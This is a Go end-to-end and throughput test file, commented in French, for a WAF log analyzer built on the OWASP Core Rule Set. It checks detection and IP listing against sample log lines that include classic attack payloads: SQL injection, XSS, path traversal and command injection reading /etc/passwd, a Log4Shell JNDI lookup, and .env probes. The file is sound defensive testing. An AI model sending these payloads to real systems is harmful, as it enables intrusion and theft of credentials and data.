package service

import (
	"context"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"nginx-analyzer-go/internal/waf/wtest"
)

// Tests de bout en bout avec le vrai CRS (variable WAF_TEST_CRS : clone du depot CRS).
func realCRS(t testing.TB) string {
	src := os.Getenv("WAF_TEST_CRS")
	if src == "" {
		t.Skip("WAF_TEST_CRS absent : test avec le vrai CRS ignore")
	}
	return wtest.CopyCRS(t, src)
}

var legitURLs = []string{
	"/", "/index.html", "/favicon.ico", "/robots.txt", "/sitemap.xml",
	"/blog/2025/10/mon-premier-article-sur-nginx?utm_source=rss&utm_medium=feed",
	"/static/css/app.3f9a1c.css", "/static/js/main.chunk.8d2e.js?v=20251010", "/images/logo@2x.png",
	"/products?category=books&page=3&sort=price_desc", "/products/12345", "/search?q=chaussures+de+running&lang=fr",
	"/search?q=caf%C3%A9+cr%C3%A8me", "/api/v1/users?limit=20&offset=40", "/api/v1/orders/9f8e7d6c-1234-4abc-9def-0123456789ab",
	"/login?next=%2Fdashboard", "/user/profile?id=42", "/contact?email=jean.dupont%40example.com&subject=Bonjour",
	"/download/rapport-annuel-2024.pdf", "/docs/getting-started/installation", "/feed.xml", "/wp-content/uploads/2025/09/photo-vacances.jpg",
	"/assets/fonts/inter-var.woff2", "/health", "/.well-known/acme-challenge/abcDEF123_-xyz", "/api/search?filter=%7B%22name%22%3A%22test%22%7D",
	"/cart/add?sku=AB-1234&qty=2", "/events/2025-12-31?tz=Europe%2FParis", "/a/b/c/d/e/f/g/h?x=1&y=2&z=3&w=4&v=5",
	"/oauth/callback?code=4%2F0AX4XfWh_aBcDeFgHiJkLmNoPqRsTuVwXyZ&state=xyz123",
	"/tag/s%C3%A9curit%C3%A9/page/2/", "/img/thumb/300x200/cover.webp?t=1696939200",
}

var legitUAs = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"curl/8.5.0",
}

func TestE2ERealCRS(t *testing.T) {
	rules := realCRS(t)
	e := newEnv(t, rules, nil)
	for _, n := range []string{"site.example.com.access.log", "multi.access.log", "waf.wafemu.log"} {
		e.write(t, n)
	}
	e.start(t)
	info := e.svc.eng.Info()
	if len(info.FilesIgnored) != 0 || info.RulesLoaded < 300 {
		t.Fatalf("moteur : %d regles, ignores %+v", info.RulesLoaded, info.FilesIgnored)
	}
	st := e.svc.Status(context.Background())
	if len(st.UnreliableRules["combined"]) < 13 || len(st.UnreliableRules["waf_json"]) == 0 {
		t.Fatalf("unreliableRules: %+v", st.UnreliableRules)
	}
	// remediate sur site.example.com, observe sur obs.example.com (via le format vhost)
	put(t, e.svc, `{"vhosts":{"site.example.com":{"mode":"remediate"},"obs.example.com":{"mode":"observe"}}}`)
	lines := 0
	w := func(name string, l ...string) { e.write(t, name, l...); lines += len(l) }

	// ---------- trafic normal : AUCUN hit en PL1 (combined) ----------
	var legit []string
	for i, u := range legitURLs {
		ip := fmt.Sprintf("198.51.100.%d", 100+i)
		legit = append(legit, combined(ip, "GET", u, 200, legitUAs[i%len(legitUAs)]))
	}
	legit = append(legit,
		combined("198.51.100.150", "POST", "/login", 302, legitUAs[0]),
		combined("198.51.100.151", "POST", "/api/v1/orders", 201, legitUAs[0]),
		combined("198.51.100.152", "HEAD", "/", 200, "curl/8.5.0"),
		combined("198.51.100.153", "OPTIONS", "/api/v1/users", 204, legitUAs[0]),
		combined("198.51.100.154", "PUT", "/api/v1/users/42", 200, legitUAs[0]),
		combined("198.51.100.155", "DELETE", "/api/v1/users/42", 204, legitUAs[0]),
	)
	w("site.example.com.access.log", legit...)
	e.settle(t, lines)
	if tot, hs := e.hits(t, nil); tot != 0 {
		t.Fatalf("faux positifs sur le trafic normal (PL1, combined) : %d %+v", tot, hs)
	}

	// ---------- attaques connues (combined, remediate) ----------
	atkIP := "203.0.113.10"
	w("site.example.com.access.log",
		combined(atkIP, "GET", "/index.php?id=1'%20OR%20'1'='1", 200, legitUAs[0]),
		combined(atkIP, "GET", "/?q=%3Cscript%3Ealert(1)%3C/script%3E", 200, legitUAs[0]),
		combined(atkIP, "GET", "/?q=<script>alert(1)</script>", 200, legitUAs[0]),
		combined(atkIP, "GET", "/download?file=../../etc/passwd", 404, legitUAs[0]),
	)
	e.settle(t, lines)
	tot, hs := e.hits(t, func(q *HitQ) { q.IP = atkIP })
	if tot != 4 {
		t.Fatalf("attaques : %d hits %+v", tot, hs)
	}
	want := []int{942100, 941110, 941110, 930100}
	got := map[string]bool{}
	for _, h := range hs { // desc
		got[h.URI] = true
		if h.Mode != "remediate" || h.Score < 5 {
			t.Errorf("hit: %+v", h)
		}
	}
	_ = want
	for _, id := range []int{942100, 941110, 930100} {
		found := false
		for _, h := range hs {
			found = found || h.has(id)
		}
		if !found {
			t.Errorf("regle %d attendue sur les attaques", id)
		}
	}
	if l, _ := e.svc.ListIPs("block"); !strings.Contains(l, atkIP) {
		t.Fatalf("%s doit etre en block (remediate) : %q", atkIP, l)
	}
	lsb, _ := e.svc.Lists("block")
	if lsb[0].IPs[0].Score < 25 || len(lsb[0].IPs[0].Vhosts) != 1 || lsb[0].IPs[0].Vhosts[0] != "site.example.com" || len(lsb[0].IPs[0].TopRules) == 0 {
		t.Fatalf("liste: %+v", lsb[0].IPs[0])
	}

	// UA sqlmap + probes
	scanIP := "203.0.113.11"
	w("site.example.com.access.log",
		combined(scanIP, "GET", "/", 200, "sqlmap/1.7.2#stable (https://sqlmap.org)"),
		combined(scanIP, "GET", "/.env", 404, legitUAs[0]),
		combined(scanIP, "GET", "/wp-config.php.bak", 404, legitUAs[0]),
	)
	e.settle(t, lines)
	_, hs = e.hits(t, func(q *HitQ) { q.IP = scanIP })
	if len(hs) != 3 {
		t.Fatalf("scanner : %+v", hs)
	}
	rulesSeen := map[int]bool{}
	for _, h := range hs {
		for _, r := range h.Rules {
			rulesSeen[r] = true
		}
	}
	for _, id := range []int{913100, 930130} {
		if !rulesSeen[id] {
			t.Errorf("regle %d attendue (scanner/probes): %v", id, rulesSeen)
		}
	}
	// score: sqlmap (913100=5 ...) + 5 + 5+ ... >= 10 -> au moins challenge
	if l, _ := e.svc.ListIPs("challenge"); !strings.Contains(l, scanIP) {
		if b, _ := e.svc.ListIPs("block"); !strings.Contains(b, scanIP) {
			t.Fatal("scanner non liste")
		}
	}

	// probe isolee : un seul hit de 5 points => ni challenge ni block
	lowIP := "203.0.113.12"
	w("site.example.com.access.log", combined(lowIP, "GET", "/.env", 404, legitUAs[0]))
	e.settle(t, lines)
	for _, l := range []string{"block", "challenge"} {
		if txt, _ := e.svc.ListIPs(l); strings.Contains(txt, lowIP) {
			t.Fatalf("%s listee (%s) avec un seul hit", lowIP, l)
		}
	}

	// ---------- observe : AUCUNE liste, mais hits et alertes ----------
	obsIP := "203.0.113.13"
	var obs []string
	for i := 0; i < 8; i++ {
		obs = append(obs, vhostLine("obs.example.com", obsIP, "GET", fmt.Sprintf("/index.php?id=%d'%%20OR%%20'1'='1", i), 200, "sqlmap/1.7"))
	}
	w("multi.access.log", obs...)
	e.settle(t, lines)
	if tot, _ := e.hits(t, func(q *HitQ) { q.IP = obsIP }); tot != 8 {
		t.Fatalf("hits observe: %d", tot)
	}
	for _, l := range []string{"block", "challenge"} {
		if txt, _ := e.svc.ListIPs(l); strings.Contains(txt, obsIP) {
			t.Fatalf("IP observe listee (%s)", l)
		}
	}
	alerts, _, _ := e.svc.Alerts(context.Background(), 0, true, 500, false)
	var obsAlerts []AlertDoc
	for _, a := range alerts {
		if a.IP == obsIP {
			obsAlerts = append(obsAlerts, a)
		}
	}
	if len(obsAlerts) == 0 || obsAlerts[len(obsAlerts)-1].Severity != "high" || obsAlerts[0].Evidence.Mode != "observe" || obsAlerts[0].Evidence.Listed != nil || obsAlerts[0].Vhost != "obs.example.com" {
		t.Fatalf("alertes observe: %+v", obsAlerts)
	}
	if len(obsAlerts) > 3 {
		t.Fatalf("une alerte par fenetre, sauf montee de severite : %d", len(obsAlerts))
	}

	// ---------- waf_json : en-tetes reels, POST JSON ----------
	jsIP := "203.0.113.14"
	w("waf.wafemu.log",
		jsonLine("api.example.com", jsIP, "POST", "/v1/search?id=1'%20or%20'1'='1", 200, legitUAs[0], `,"ct":"application/json","cl":"34","acc":"application/json","al":"fr-FR","ae":"gzip, br","org":"https://app.example.com","xrw":"XMLHttpRequest"`),
		jsonLine("api.example.com", "198.51.100.200", "POST", "/v1/orders", 201, legitUAs[0], `,"ct":"application/json","cl":"120","acc":"application/json","al":"fr-FR","ae":"gzip, br","org":"https://app.example.com","xrw":"XMLHttpRequest"`),
		jsonLine("api.example.com", "198.51.100.201", "GET", "/v1/items?limit=10", 200, legitUAs[0], `,"acc":"application/json"`),
	)
	e.settle(t, lines)
	if tot, hs := e.hits(t, func(q *HitQ) { q.Vhost = "api.example.com" }); tot != 1 || hs[0].IP != jsIP || !hs[0].has(942100) {
		t.Fatalf("waf_json: %d %+v", tot, hs)
	}
	_, full, _ := e.svc.QueryHits(context.Background(), (&HitQ{Vhost: "api.example.com", Limit: 5}).filter())
	if full[0].Format != "waf_json" || full[0].Method != "POST" {
		t.Fatalf("hit waf_json: %+v", full[0])
	}

	// ---------- exceptions ----------
	exIP := "203.0.113.15"
	put(t, e.svc, `{"exceptions":[{"id":"ex-env","rule":930130,"vhost":"site.example.com","pathPrefix":"/.env","reason":"test"}]}`)
	w("site.example.com.access.log", combined(exIP, "GET", "/.env", 404, legitUAs[0]), combined(exIP, "GET", "/wp-config.php.bak", 404, legitUAs[0]))
	e.settle(t, lines)
	_, hs = e.hits(t, func(q *HitQ) { q.IP = exIP })
	if len(hs) != 1 || hs[0].URI != "/wp-config.php.bak" {
		t.Fatalf("exception pathPrefix: %+v", hs)
	}
	r, _ := e.svc.Simulate(SimInput{URI: "/.env", Vhost: "site.example.com", UA: legitUAs[0]})
	if r.Score != 0 || len(r.Hits) == 0 || r.Hits[0].Suppressed == nil || *r.Hits[0].Suppressed != "exception" {
		t.Fatalf("simulate exception: %+v", r)
	}
	put(t, e.svc, `{"exceptions":[]}`)

	// ---------- desactivation d'une regle => alerte supprimee a la lecture ----------
	dIP := "203.0.113.16"
	w("site.example.com.access.log", combined(dIP, "GET", "/.env", 404, legitUAs[0]), combined(dIP, "GET", "/.env", 404, legitUAs[0]))
	e.settle(t, lines)
	has := func(raw bool) bool {
		al, _, _ := e.svc.Alerts(context.Background(), 0, true, 500, raw)
		for _, a := range al {
			if a.IP == dIP {
				return true
			}
		}
		return false
	}
	if !has(false) {
		t.Fatal("alerte attendue pour /.env x2")
	}
	put(t, e.svc, `{"disabledRules":[930130]}`)
	if has(false) || !has(true) {
		t.Fatal("la desactivation de 930130 doit masquer l'alerte (et raw la montrer)")
	}
	put(t, e.svc, `{"disabledRules":[]}`)

	// ---------- statistiques ----------
	sd, err := e.svc.HitStats(context.Background(), 24)
	if err != nil {
		t.Fatal(err)
	}
	if sd.Requests != lines || sd.HitRequests == 0 || len(sd.TopRules) == 0 || len(sd.TopIps) == 0 || len(sd.TopVhosts) == 0 || len(sd.ByCategory) == 0 || len(sd.Timeline) < 90 {
		t.Fatalf("stats: req=%d (lines=%d) hits=%d rules=%d ips=%d vhosts=%d cats=%d timeline=%d", sd.Requests, lines, sd.HitRequests, len(sd.TopRules), len(sd.TopIps), len(sd.TopVhosts), len(sd.ByCategory), len(sd.Timeline))
	}
	foundBlock := false
	for _, ip := range sd.TopIps {
		if ip.IP == atkIP && len(ip.Lists) == 1 && ip.Lists[0] == "block" {
			foundBlock = true
		}
	}
	if !foundBlock {
		t.Fatalf("topIps: %+v", sd.TopIps)
	}
	cats, _ := e.svc.HitStats(context.Background(), 1)
	_ = cats

	// ---------- informatif : PL2 sur le meme trafic normal ----------
	put(t, e.svc, `{"paranoia":2}`)
	waitFor(t, 20*time.Second, "PL2", func() bool { return e.svc.eng.Paranoia() == 2 })
	before, _ := e.hits(t, nil)
	var l2 []string
	for i, u := range legitURLs {
		l2 = append(l2, combined(fmt.Sprintf("198.51.100.%d", 100+i), "GET", u, 200, legitUAs[i%len(legitUAs)]))
	}
	w("site.example.com.access.log", l2...)
	e.settle(t, lines)
	after, hs2 := e.hits(t, nil)
	t.Logf("PL2 sur %d URLs legitimes : %d hit(s)", len(l2), after-before)
	for _, h := range hs2[:min(len(hs2), after-before)] {
		t.Logf("  PL2 hit: %s %v", h.URI, h.Rules)
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// Debit : 50 000 lignes realistes (97 % normales, 3 % attaques), 400 IP, format combined.
func TestThroughputRealCRS(t *testing.T) {
	rules := realCRS(t)
	const N = 50000
	e := newEnv(t, rules, func(c *Config) {
		if w, err := strconv.Atoi(os.Getenv("WAF_TEST_WORKERS")); err == nil {
			c.Workers = w
		}
	})
	rng := rand.New(rand.NewSource(1))
	attacks := []string{
		"/index.php?id=1'%20OR%20'1'='1", "/?q=%3Cscript%3Ealert(1)%3C/script%3E", "/download?file=../../etc/passwd", "/.env", "/wp-config.php.bak",
		"/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users--", "/cgi-bin/;cat%20/etc/passwd", "/phpmyadmin/index.php?a=${jndi:ldap://x/a}",
	}
	var b strings.Builder
	b.Grow(N * 230)
	nAtk := 0
	for i := 0; i < N; i++ {
		ip := fmt.Sprintf("198.51.%d.%d", 100+rng.Intn(4), 1+rng.Intn(100))
		ua := legitUAs[rng.Intn(len(legitUAs))]
		uri := legitURLs[rng.Intn(len(legitURLs))]
		if rng.Intn(3) == 0 {
			uri = fmt.Sprintf("/articles/%d/comments?page=%d&sort=recent", rng.Intn(100000), rng.Intn(50))
		}
		if rng.Intn(100) < 3 {
			uri = attacks[rng.Intn(len(attacks))]
			nAtk++
			ip = fmt.Sprintf("203.0.113.%d", 1+rng.Intn(250))
		}
		fmt.Fprintf(&b, "%s - - [%s] \"GET %s HTTP/1.1\" 200 %d \"https://example.com/\" \"%s\"\n", ip, ts(), uri, 200+rng.Intn(50000), ua)
	}
	if err := os.WriteFile(filepath.Join(e.logs, "perf.example.com.access.log"), []byte(b.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	e.svc.cfg.QueueSize = 0
	e.svc.Start()
	waitFor(t, 30*time.Second, "moteur", func() bool { return e.svc.eng.Ready() })
	start := time.Now()
	waitFor(t, 5*time.Minute, "50 000 lignes", func() bool { return e.svc.linesAnalyzed.Load() >= N })
	if !e.svc.Sync(2 * time.Minute) {
		t.Fatal("Sync")
	}
	el := time.Since(start)
	tot, _ := e.hits(t, nil)
	t.Logf("DEBIT : %d lignes en %.2f s = %.0f lignes/s (%d workers, GOMAXPROCS=%d) ; %d requetes avec hit ; evaluation moyenne %.2f ms",
		N, el.Seconds(), float64(N)/el.Seconds(), e.svc.cfg.Workers, goMaxProcs(), tot, e.svc.avgEvalMs())
	if e.svc.queueDropped.Load() != 0 {
		t.Errorf("lignes perdues (file saturee) : %d", e.svc.queueDropped.Load())
	}
	if tot < nAtk/2 {
		t.Errorf("hits trop peu nombreux : %d pour %d attaques", tot, nAtk)
	}
}
